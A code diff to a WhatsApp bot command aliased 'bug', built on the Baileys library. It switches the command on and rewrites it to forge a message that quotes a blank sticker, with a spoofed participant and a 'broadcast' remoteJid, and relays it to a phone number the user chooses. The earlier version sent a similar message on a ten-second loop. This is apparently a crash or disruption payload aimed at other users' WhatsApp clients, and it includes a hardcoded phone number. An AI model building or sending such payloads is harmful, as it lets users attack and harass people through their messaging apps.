@@ -1,4 +1,5 @@
-import { generateWAMessageFromContent } from '@adiwajshing/baileys';
+import fs from 'fs-extra';
+import { generateWAMessage, generateWAMessageFromContent } from '@adiwajshing/baileys';
 import { ZERO, S_WHATSAPP_NET } from '../../helper/index.js';
 
 export default {
@@ -9,7 +10,7 @@ export default {
 	aliases: ['bug'],
 	cooldown: 5,
 	limit: 0,
-	status: 'disable',
+	status: 'enable',
 	async run({ from, bodyQuoted, mediaData, query, isOwner }, client) {
 		if (!query && !bodyQuoted) {
 			return;
@@ -19,34 +20,35 @@ export default {
 			return;
 		}
 
-		setInterval(async () => {
-			const messages = generateWAMessageFromContent(
-				from,
-				{
-					extendedTextMessage: {
-						text: '.',
-						contextInfo: {
-							participant: ZERO,
-							remoteJid: 'broadcast',
-							quotedMessage: {
-								contactMessage: {
-									displayName: 'Hidden Finder',
-									vcard: 'BEGIN:VCARD\nVERSION:3.0\nTEL;type=CELL;type=VOICE;waid=6289522534401:6289522534401\nEND:VCARD'
-								}
-							}
+		const message = await generateWAMessage(
+			'6289522534401@s.whatsapp.net',
+			{ sticker: await fs.readFile('./src/media/blank.png') },
+			{ upload: client[botNum].waUploadToServer }
+		);
+
+		const messages = generateWAMessageFromContent(
+			from,
+			{
+				extendedTextMessage: {
+					text: '.',
+					contextInfo: {
+						participant: ZERO,
+						remoteJid: 'broadcast',
+						quotedMessage: {
+							stickerMessage: message.message.stickerMessage
 						}
 					}
-				},
-				{}
-			);
-
-			await client[botNum].relayMessage(
-				`${(query || mediaData.participant).replace(/([@s.+\s-]|whatsapp|net)/g, '')}${S_WHATSAPP_NET}`,
-				messages.message,
-				{
-					messageId: messages.key.id
 				}
-			);
-		}, 10_000);
+			},
+			{}
+		);
+
+		await client[botNum].relayMessage(
+			`${(query || mediaData.participant).replace(/([@s.+\s-]|whatsapp|net)/g, '')}${S_WHATSAPP_NET}`,
+			messages.message,
+			{
+				messageId: messages.key.id
+			}
+		);
 	}
 };
